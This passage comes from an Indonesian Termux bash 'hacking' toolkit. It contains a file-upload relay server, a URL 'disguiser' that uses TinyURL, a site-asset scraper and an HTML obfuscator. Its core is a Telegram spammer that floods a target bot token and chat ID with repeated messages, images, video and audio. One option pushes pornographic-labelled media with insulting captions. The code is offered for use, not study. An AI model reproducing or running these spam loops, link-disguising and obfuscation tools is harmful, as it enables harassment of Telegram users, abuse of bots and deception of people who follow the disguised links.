.result{background:#1a1f2e;border-radius:15px;padding:20px;margin-top:20px;display:none}
.result.success{display:block;border-left:4px solid #10b981}
.result.error{display:block;border-left:4px solid #ef4444}
.url{background:#000;padding:10px;border-radius:10px;word-break:break-all;margin:10px 0}
.url a{color:#60a5fa;text-decoration:none}
.copy-btn{background:#2d2f42;border:none;padding:8px 20px;border-radius:20px;color:#fff;cursor:pointer;font-size:12px}
.loader{display:inline-block;width:20px;height:20px;border:2px solid #fff;border-radius:50%;border-top-color:#a855f7;animation:spin 0.6s linear infinite;margin-right:10px}
@keyframes spin{to{transform:rotate(360deg)}}
.footer{text-align:center;font-size:11px;color:#555;margin-top:30px;padding-top:20px;border-top:1px solid #1a1f2e}
</style>
</head>
<body>
<div class="container">
<div class="box">
<h1>UPLOADER VIDEO</h1>
<div class="sub">Moonlight Edition • Unlimited Size</div>
<div class="upload-area" id="dropZone">
<div style="font-size:40px">☁️</div>
<div style="margin:10px 0">Klik atau drag & drop file</div>
<div style="font-size:12px;color:#888">MP4, JPG, PNG, PDF, etc</div>
<input type="file" id="fileInput">
</div>
<div id="fileInfo" class="file-info" style="display:none"></div>
<button id="uploadBtn">🚀 UPLOAD SEKARANG</button>
<div id="result" class="result"></div>
</div>
<div class="footer">🔗 gobox.my.id • Port: """ + str(PORT) + """</div>
</div>
<script>
let selectedFile = null;
const dropZone = document.getElementById('dropZone');
const fileInput = document.getElementById('fileInput');
const fileInfo = document.getElementById('fileInfo');
const uploadBtn = document.getElementById('uploadBtn');
const resultDiv = document.getElementById('result');
function formatBytes(bytes) {
    if(bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}
function updateFileInfo(file) {
    if(!file) {
        fileInfo.style.display = 'none';
        return;
    }
    fileInfo.innerHTML = '📎 ' + file.name + ' (' + formatBytes(file.size) + ')';
    fileInfo.style.display = 'block';
}
fileInput.addEventListener('change', (e) => {
    if(e.target.files && e.target.files[0]) {
        selectedFile = e.target.files[0];
        updateFileInfo(selectedFile);
    }
});
dropZone.addEventListener('dragover', (e) => {
    e.preventDefault();
    dropZone.style.background = 'rgba(124,58,237,0.2)';
});
dropZone.addEventListener('dragleave', () => {
    dropZone.style.background = 'transparent';
});
dropZone.addEventListener('drop', (e) => {
    e.preventDefault();
    dropZone.style.background = 'transparent';
    if(e.dataTransfer.files && e.dataTransfer.files[0]) {
        selectedFile = e.dataTransfer.files[0];
        fileInput.files = e.dataTransfer.files;
        updateFileInfo(selectedFile);
    }
});
dropZone.addEventListener('click', () => fileInput.click());
uploadBtn.addEventListener('click', async () => {
    if(!selectedFile) {
        alert('Pilih file dulu!');
        return;
    }   
    resultDiv.innerHTML = '<div class="loader"></div> Mengupload...';
    resultDiv.className = 'result';
    uploadBtn.disabled = true;
    const formData = new FormData();
    formData.append('photo', selectedFile); 
    try {
        const res = await fetch('/upload', { method: 'POST', body: formData });
        const data = await res.json();       
        if(data.url) {
            resultDiv.className = 'result success';
            resultDiv.innerHTML = '<strong>✅ BERHASIL!</strong><div class="url"><a href="'+data.url+'" target="_blank">'+data.url+'</a></div><button class="copy-btn" onclick="navigator.clipboard.writeText(\\''+data.url+'\\');alert(\\'Tersalin!\\')">📋 SALIN LINK</button>';
        } else {
            throw new Error(data.error || 'Gagal upload');
        }
    } catch(err) {
        resultDiv.className = 'result error';
        resultDiv.innerHTML = '<strong>❌ GAGAL!</strong><br>' + err.message;
    } finally {
        uploadBtn.disabled = false;
    }
});
</script>
</body>
</html>
"""
class Handler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        return
    def do_GET(self):
        if self.path in ('/', '/index.html'):
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(HTML.encode())
        else:
            self.send_error(404)    
    def do_POST(self):
        if self.path != '/upload':
            self.send_error(404)
            return       
        try:
            ct = self.headers.get('Content-Type', '')
            cl = int(self.headers.get('Content-Length', 0))
            raw = self.rfile.read(cl)            
            match = re.search(r'boundary=(.+)', ct)
            if not match:
                self.send_error(400)
                return            
            boundary = match.group(1).encode()
            parts = raw.split(b'--' + boundary)
            content = None
            fname = None          
            for part in parts:
                if b'Content-Disposition' in part:
                    fn = re.search(rb'filename="([^"]+)"', part)
                    if fn:
                        fname = fn.group(1).decode()
                    sep = part.find(b'\r\n\r\n')
                    if sep != -1:
                        start = sep + 4
                        end = part.rfind(b'\r\n--')
                        if end == -1:
                            end = len(part)
                        content = part[start:end]
                        break           
            if not content or not fname:
                self.send_error(400)
                return            
            fid = uuid.uuid4().hex[:8]
            ext = fname.split('.')[-1] if '.' in fname else 'bin'
            path = os.path.join(SAVE_DIR, f'temp_{fid}.{ext}')          
            with open(path, 'wb') as f:
                f.write(content)          
            with open(path, 'rb') as f:
                r = requests.post('https://www.gobox.my.id/upload', files={'file': (fname, f)}, timeout=180)          
            os.remove(path)
            res = r.json()            
            if r.status_code == 200 and res.get('url'):
                data = {'url': res['url']}
            else:
                data = {'error': res.get('error', 'Upload failed')}                
        except Exception as e:
            data = {'error': str(e)}        
        js = json.dumps(data).encode()
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', len(js))
        self.end_headers()
        self.wfile.write(js)
print(f'\n✅ Server : http://localhost:{PORT}')
print(f'📁 Temp : {SAVE_DIR}')
print('Press Ctrl+C to stop\n')
try:
    HTTPServer(('0.0.0.0', PORT), Handler).serve_forever()
except KeyboardInterrupt:
    print('\n🛑 Stopped')
PYEOF
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$all" == "25" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Hacking !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\033[0m'
echo ""
if ! command -v curl &> /dev/null; then
    clear 
    echo ""
    echo -e "${r}[ ${g}x ${r}]${c} curl belum terinstall, sedang menginstall..!!"
    echo -e "${n}"
    sleep 3 
    pkg install curl -y
else
    clear 
    echo ""
    echo -e "${r}[ ${g}✓ ${r}]${y} curl sudah terinstall."
    echo ""
    sleep 3 
fi
if ! command -v jq &> /dev/null; then
    clear 
    echo ""
    echo -e "${r}[ ${g}x ${r}]${c} jq belum terinstall, sedang menginstall..!!"
    echo -e "${n}"
    sleep 3 
    pkg install jq -y
else
    clear 
    echo ""
    echo -e "${r}[ ${g}✓ ${r}]${y} jq sudah terinstall."
    echo ""
    sleep 3 
fi
clear
echo "
██████╗ ██╗████████╗██╗  ██╗   ██╗
██╔══██╗██║╚══██╔══╝██║  ╚██╗ ██╔╝
██████╔╝██║   ██║   ██║   ╚████╔╝ 
██╔══██╗██║   ██║   ██║    ╚██╔╝  
██████╔╝██║   ██║   ███████╗██║   
╚═════╝ ╚═╝   ╚═╝   ╚══════╝╚═╝" | lolcat
echo -e "${c}Development ${n}: ${y}Thxyzz404"
echo -e "${g}"
read -p "Masukkan url anda : " cok
echo ""
urlencode() {
    local string="$1"
    local encoded=""
    local length="${#string}"    
    for (( i = 0; i < length; i++ )); do
        local c="${string:$i:1}"
        case $c in
            [a-zA-Z0-9.~_-]) encoded+="$c" ;;
            *) encoded+=$(printf '%%%02X' "'$c") ;;
        esac
    done
    echo "$encoded"
}
if [[ -z "$cok" ]]; then
    clear 
    echo ""
    echo -e "${r}Error : URL tidak boleh kosong..!!"
    echo ""
    pkill -9 -f com.termux
fi
if [[ ! "$cok" =~ ^https?:// ]] && [[ ! "$cok" =~ ^ftp:// ]]; then
    url="http://$cok"
fi
echo -e "${r}[ ${g}+ ${r}]${c} Memproses url akan di samarkan..!!"
echo ""
encoded_url=$(urlencode "$cok")
pantau_aktivitas
short=$(curl -s -m 10 "https://tinyurl.com/api-create.php?url=${encoded_url}")
if [[ "$short" == http* ]] && [[ "$short" != *"Error"* ]]; then
    ajg="ansi-rounded"
    echo "URL telah di samarkan : $short" | boxes -d "$ajg" | lolcat
  else
    clear 
    echo ""
    echo -e "${r}Error : Gagal menyamarkan URL..!!"
    echo ""
    echo -e "${g}Kemungkinan masalah."
    echo -e "${r}[ 1 ] URL tidak valid."
    echo -e "${c}[ 2 ] Koneksi internet bermasalah."
    echo -e "${y}[ 3 ] TinyURL sedang down servernya."
fi
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$all" == "26" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Hacking !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
c='\033[36;1m'
p='\033[35;1m'
g='\033[32;1m'
y='\033[33;1m'
r='\033[31;1m'
mpv --no-video --quiet "$HOME/Yalakan/Y.mp3" &> /dev/null &
echo "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣿⣿⣶⣶⣶⣶⣦⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠶⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡄⢀⠴⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣎⣴⣋⣠⣤⣔⣠⣤⣤⣠⣀⣀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣂⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⡾⣻⣿⣿⣿⣿⠿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⣧⡀⠀
⠀⠀⠀⠀⠀⣀⣾⣿⣿⣿⠿⠛⠂⠀⠀⡀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡈⢻⣿⣿⣆⠈⢻⣧⠀
⠀⠀⠀⠀⠻⣿⠛⠉⠀⠀⠀⠀⢀⣤⣾⣿⣦⣤⣤⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠙⢿⣿⣿⣿⡇⠀⢻⣿⣿⡀⠀⠻⡆
⠀⠀⣰⣤⣤⣤⣤⣤⣤⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠈⢻⣿⣿⣿⠀⠀⢹⣿⣇⠀⠀⠳
⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢻⠛⠛⠻⣿⣿⣿⣿⣿⣿⣿⣧⠀⢻⣿⣿⡆⠀⠀⢻⣿⠀⠀⠀
⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠼⠛⢿⣶⣦⣿⣿⠻⣿⣿⣿⣿⣿⣇⠀⢻⣿⡇⠀⠀⠀⣿⠀⠀⠀
⠸⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⠀⠀⠀⠀⠀⠘⠁⠈⠛⠋⠀⠘⢿⣿⣿⣿⣿⡀⠈⣿⡇⠀⠀⠀⢸⡇⠀⠀
⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⡇⠀⢹⠇⠀⠀⠀⠈⠀⠀⠀
⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⡇⠀⠼⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡉⠛⠛⠿⠿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⢿⣿⣿⣿⣷⡀⠉⠙⠻⠿⢿⣿⣷⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⢀⡄⠀⠀⠀⢀⣠⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⢦⣀⠀⠀⠀⢀⣴⣿⣧⣤⣴⣾⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠛⠛⠛⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
" | lolcat 
echo ""
echo -e "${y} Gunakan Link Upload Gambar ini : ${c}https://top4top.io"
echo -e "${g}================================================"
echo -e "${r}       Spammer Telegram By.Thxyzz404"
echo -e "${g}================================================"
echo ""
echo -e "${r}[ ${g}01 ${r}] ${c}Spam Teks Biasa"
echo -e "${r}[ ${g}02 ${r}] ${c}Spam Teks Auto Virtex"
echo -e "${r}[ ${g}03 ${r}] ${c}Spam Teks + Gambar + Video + Audio"
echo -e "${r}[ ${g}04 ${r}] ${c}Spam Auto Hitam Bokep"
echo -e "${r}[ ${g}00 ${r}] ${y}Kembali Ke ToolslV"
echo -e "${g}"
read -p "Silahkan Pilih : " kuy
case $kuy in
 1|01)
send_text_message() {
    TOKEN=$1
    CHAT_ID=$2
    MESSAGE=$3
    curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" \
     -d chat_id="$CHAT_ID" \
     -d text="$MESSAGE" > /dev/null 2>&1
}
loading_bar() {
frames=(
"[\e[1;91m■\e[0m□□□□□□□□□]"
"[\e[1;92m■■\e[0m□□□□□□□□]"
"[\e[1;93m■■■\e[0m□□□□□□□]"
"[\e[1;94m■■■■\e[0m□□□□□□]"
"[\e[1;95m■■■■■\e[0m□□□□□]"
"[\e[1;96m■■■■■■\e[0m□□□□]"
"[\e[1;97m■■■■■■■\e[0m□□□]"
"[\e[1;92m■■■■■■■■\e[0m□□]"
"[\e[1;93m■■■■■■■■■\e[0m□]"
"[\e[1;94m■■■■■■■■■■\e[0m]"
  )
  local count=0
  while [ $count -lt $SPAM_COUNT ]; do
    for frame in "${frames[@]}"; do
      send_text_message "$BOT_TOKEN" "$CHAT_ID" "$MESSAGE"
      count=$((count+1))
      echo -ne "\r$frame"
      sleep 0.01
      if [ $count -ge $SPAM_COUNT ]; then
        break
      fi
    done
  done
  echo ""
  echo -e "${y}Sukses Pengiriman Dalam Totall ${r}: ${c}${SPAM_COUNT}"
}
echo -e "${c}"
read -p "Masukkan Pesan Teks : " MESSAGE
echo -e "${y}"
read -p "Masukkan Token Botz Target : " BOT_TOKEN
echo -e "${r}"
read -p "Masukkan Chat ID Target : " CHAT_ID
echo -e "${g}"
read -p "Masukkan Jumlah Spam Pesan Yang Ingin Dikirim : " SPAM_COUNT
echo ""
echo -e "${p}Sedang proses spam..!!"
echo ""
loading_bar
       ;;
2|02)
clear
echo "
 ▗▄▄▖▗▄▄▄▖▗▄▄▖ ▗▖  ▗▖▗▄▄▄▖▗▄▄▖ 
▐▌   ▐▌   ▐▌ ▐▌▐▌  ▐▌▐▌   ▐▌ ▐▌
 ▝▀▚▖▐▛▀▀▘▐▛▀▚▖▐▌  ▐▌▐▛▀▀▘▐▛▀▚▖
▗▄▄▞▘▐▙▄▄▖▐▌ ▐▌ ▝▚▞▘ ▐▙▄▄▖▐▌ ▐▌
" | lolcat
echo -e "${g}===============${r} Server Website ${g}==============="
echo ""
echo -e "${c} MOHON BERSABAR SEDANG PROSES LOADING..!!"
echo ""
for i in {1..10}; do
    echo -ne "\r${y} Loading..!! ${r}[ ${g}$((i * 10))% ${r}]"
    sleep 0.3
done
echo -ne "\r${y} Loading..!! ${r}[ ${g}100% ${r}]"
sleep 1
echo ""
xdg-open "https://muka-lu-kontol.vercel.app/"
echo ""
echo -e "${g} SELESAI MEMBUKA WEBSITE SERVER."
echo ""
  ;;
  3|03)
    loading_bar() {
    frames=(
        "[\e[1;91m■\e[0m□□□□□□□□□]"
        "[\e[1;92m■■\e[0m□□□□□□□□]"
        "[\e[1;93m■■■\e[0m□□□□□□□]"
        "[\e[1;94m■■■■\e[0m□□□□□□]"
        "[\e[1;95m■■■■■\e[0m□□□□□]"
        "[\e[1;96m■■■■■■\e[0m□□□□]"
        "[\e[1;97m■■■■■■■\e[0m□□□]"
        "[\e[1;92m■■■■■■■■\e[0m□□]"
        "[\e[1;93m■■■■■■■■■\e[0m□]"
        "[\e[1;94m■■■■■■■■■■\e[0m]"
    )
    while :; do
        for frame in "${frames[@]}"; do
            echo -ne "\r$frame Mengirim...!!"
            sleep 0.2
        done
    done
}
echo -e "${c}"
read -p "Masukkan Token Botz : " token
echo -e "${g}"
read -p "Masukkan ID Botz : " chat_id
echo -e "${c}"
read -p "Masukkan Pesan Untuk Botz : " text
echo -e "${y}"
read -p "Masukkan Image Url Gambar Anda : " photo_url
echo -e "${c}"
read -p "Masukkan Video Url Anda : " video_url
echo -e "${g}"
read -p "Masukkan Audio Url Anda : " audio_url
echo -e "${y}"
read -p "Masukkan Jumlah Spam : " jumlah
echo ""
if ! [[ "$jumlah" =~ ^[0-9]+$ ]]; then
    echo -e "${r}Error : Jumlah Harus Berupa Angka..!!"
    echo ""
    echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
    read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
    clear
fi
loading_bar &
pid=$!
for ((i = 0; i < jumlah; i++)); do
    if [[ -n "$photo_url" ]]; then
        curl -s -X POST "https://api.telegram.org/bot${token}/sendPhoto" \
            -F "chat_id=${chat_id}" \
            -F "photo=${photo_url}" \
            -F "caption=${text}" > /dev/null
    fi
    if [[ -n "$video_url" ]]; then
        curl -s -X POST "https://api.telegram.org/bot${token}/sendVideo" \
            -F "chat_id=${chat_id}" \
            -F "video=${video_url}" \
            -F "caption=${text}" > /dev/null
    fi
    if [[ -n "$audio_url" ]]; then
        curl -s -X POST "https://api.telegram.org/bot${token}/sendAudio" \
            -F "chat_id=${chat_id}" \
            -F "audio=${audio_url}" \
            -F "caption=${text}" > /dev/null
    fi
    if [[ -z "$photo_url" && -z "$video_url" && -z "$audio_url" ]]; then
        curl -s -X POST "https://api.telegram.org/bot${token}/sendMessage" \
            -d "chat_id=${chat_id}" \
            -d "text=${text}" > /dev/null
    fi
done
kill $pid
wait $pid 2>/dev/null
echo -e "${g} Proses selesai dengan jumlah : ${jumlah}"
  ;;
4|04)
echo -e "${p}"
read -p "Masukkan Bot Token : " TOKEN
echo -e "${c}"
read -p "Masukkan Chat ID : " CHAT_ID
echo -e "${y}"
read -p "Masukkan jumlah pengiriman : " JUMLAH
echo ""
if [[ -z "$TOKEN" || -z "$CHAT_ID" || -z "$JUMLAH" ]]; then
    clear 
    echo ""
    echo -e "${c}Token, Chat ID, atau Jumlah tidak boleh kosong!"
    echo ""
fi
if ! [[ "$JUMLAH" =~ ^[0-9]+$ ]] || [[ "$JUMLAH" -lt 1 ]]; then
    clear 
    echo ""
    echo -e "${g}Jumlah harus angka positif!"
    echo ""
fi
PHOTO_URL="https://l.top4top.io/p_3539d0y7d1.jpg"
AUDIO_URL="https://h.top4top.io/m_3588buygi1.mp3"
CAPTION="Bang Bokep Nih Bang Enak Hahaha 😹🖕"
loading_bar() {
    local pid=$1
    frames=(
        "[\e[1;91m■\e[0m□□□□□□□□□]"
        "[\e[1;92m■■\e[0m□□□□□□□□]"
        "[\e[1;93m■■■\e[0m□□□□□□□]"
        "[\e[1;94m■■■■\e[0m□□□□□□]"
        "[\e[1;95m■■■■■\e[0m□□□□□]"
        "[\e[1;96m■■■■■■\e[0m□□□□]"
        "[\e[1;97m■■■■■■■\e[0m□□□]"
        "[\e[1;92m■■■■■■■■\e[0m□□]"
        "[\e[1;93m■■■■■■■■■\e[0m□]"
        "[\e[1;94m■■■■■■■■■■\e[0m]"
    )
    while kill -0 $pid 2>/dev/null; do
        for frame in "${frames[@]}"; do
            printf "\r$frame Mengirim [$COUNTER/$JUMLAH]..!! "
            sleep 0.12
        done
    done
    printf "\r%-60s\r" ""
}
echo -e "${r}[ ${g}✓ ${r}]${g} Sedang proses..!! "
echo ""
COUNTER=0
for (( i=1; i<=JUMLAH; i++ )); do
    COUNTER=$i
    CAPTION_LOOP="Goblok Lu Sangean Tolol Lu Awokawok 😂🤣"
    (
        curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendPhoto" \
            -F "chat_id=$CHAT_ID" \
            -F "photo=$PHOTO_URL" \
            -F "caption=$CAPTION_LOOP" > /dev/null
        curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendAudio" \
            -F "chat_id=$CHAT_ID" \
            -F "audio=$AUDIO_URL" \
            -F "caption=$CAPTION_LOOP" > /dev/null
        echo ""
    ) &
    loading_bar $!
    wait $!
    echo -e "${g}Kirim ke $i selesai."
    sleep 2 
    echo ""
done
echo ""
echo -e "${c}SUCCESS : Semua $JUMLAH pesan berhasil dikirim!"
echo -e "${y}========================================"
echo ""
  ;;
esac
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$all" == "27" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Hacking !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
b='\033[34;1m'
echo "
 ██████╗ ███████╗███╗   ██╗███████╗
██╔════╝ ██╔════╝████╗  ██║╚══███╔╝
██║  ███╗█████╗  ██╔██╗ ██║  ███╔╝ 
██║   ██║██╔══╝  ██║╚██╗██║ ███╔╝  
╚██████╔╝███████╗██║ ╚████║███████╗
 ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝
       Developer : Thxyzz404 " | lolcat 2>/dev/null || cat     
echo -e "${g}"                                  
read -p "Masukkan link : " get
echo -e "${c}"
if [ -z "$get" ]; then
    clear 
    echo ""
    echo -e "${r} Link jangan kosong."
fi
read -p "Masukkan nama path folder : " der
echo ""
if [ -z "$der" ]; then
    clear 
    echo ""
    echo -e "${r} Nama folder kosong kocak."
fi
sim="/sdcard/Download/$der"
mkdir -p "$sim" 2>/dev/null
if [ $? -ne 0 ]; then
    echo -e "${y} Terjadi kesalahan."
    sim="./$der"
    mkdir -p "$sim"
fi
echo -e "${r}[ ${g}✓ ${r}]${y} Menyimpan file ke : $sim"
file="$sim/temp_page.html"
url=$(echo "$get" | grep -oE '^https?://[^/]+')
echo ""
echo -e "${r}[ ${g}✓ ${r}]${c} Mengambil halaman : $get"
curl -s -k -L "$get" -o "$file"
if [ $? -ne 0 ] || [ ! -s "$file" ]; then
    clear 
    echo ""
    echo -e "${r} Gagall mengambil get"
fi
echo ""
echo -e "${r}[ ${g}✓ ${r}]${p} Mencari file JS"
echo ""
grep -oE 'src="[^"]*\.js[^"]*"' "$file" | cut -d'"' -f2 | while read js_file; do
    [ -z "$js_file" ] && continue
    if [[ "$js_file" != http* ]]; then
        js_file="$url/${js_file#/}"
    fi
    js_name=$(basename "$js_file" | cut -d'?' -f1)
    echo -e "${g}Download : $js_file"
    curl -s -k -L "$js_file" -o "$sim/$js_name"
done
echo ""
echo -e "${r}[ ${g}✓ ${r}]${b} Mencari file CSS"
echo ""
grep -oE 'href="[^"]*\.css[^"]*"' "$file" | cut -d'"' -f2 | while read css_file; do
    [ -z "$css_file" ] && continue
    if [[ "$css_file" != http* ]]; then
        css_file="$url/${css_file#/}"
    fi
    css_name=$(basename "$css_file" | cut -d'?' -f1)
    echo -e "${g}Download : $css_file"
    curl -s -k -L "$css_file" -o "$sim/$css_name"
done
echo ""
echo -e "${r}[ ${g}✓ ${r}]${y} Mencari file HTML"
echo ""
grep -oE 'href="[^"]*\.html[^"]*"' "$file" | cut -d'"' -f2 | while read html_file; do
    [ -z "$html_file" ] && continue
    if [[ "$html_file" != http* ]]; then
        html_file="$url/${html_file#/}"
    fi
    html_name=$(basename "$html_file" | cut -d'?' -f1)
    echo -e "${g}Download : $html_file"
    curl -s -k -L "$html_file" -o "$sim/$html_name"
done
mv "$file" "$sim/index.html" 2>/dev/null
echo -e "${r}[ ${g}✓ ${r}]${b} Semua file disimpan di : $sim"
echo ""
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$all" == "28" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Hacking !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
SAVE_DIR="/sdcard/A_Goblok/ENCRIPSI_HTML"
g='\033[32;1m'
r='\033[31;1m'
c='\033[36;1m'
y='\033[33;1m'
p='\033[35;1m'
show_loading() {
    local pid=$1
    local delay=0.1
    local spinstr='|/-\'
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}
thxyzz404() {
    local content="$1"
    python3 -c "
import sys
content = sys.stdin.read()
print('<!DOCTYPE html><html><head><meta charset=\"utf-8\"></head><body><script>')
print('const アイエトゥクスプフグウォ=[' + ','.join(str(ord(c)) for c in content) + '];')
print('document.write(アイエトゥクスプフグウォ.map(c => String.fromCharCode(c)).join(\"\")')
print(');</script></body></html>')
    "
}
thyzz404() {
echo "
⣿⣿⣿⠿⠿⣿⡿⠿⢿⠿⠿⠿⠿⠿⢿⠿⠿⣿⣿⠿⠿⢿⠿⠿⣿⣿⣿⣿⣿⣿⠀
⣿⣿⣿⠀⠀⠿⠇⠀⢸⣀⡀⠀⠀⣀⣸⠀⠀⠈⠏⠀⠀⢸⠀⠀⣿⣿⣿⣿⣿⣿⠀
⣿⣿⣿⠀⠀⣀⡀⠀⢸⣿⡇⠀⠀⣿⣿⠀⠀⡄⠀⡄⠀⢸⠀⠀⠿⠿⠻⣿⣿⣿⠀
⣿⣿⣿⣀⣀⣿⣇⣀⣸⣿⣧⣀⣠⣿⣿⣀⣀⣿⣾⣇⣀⣸⣀⣀⣀⣀⣸⣿⣿⣿⠀
⡿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⢿⠀
⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠀
⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀
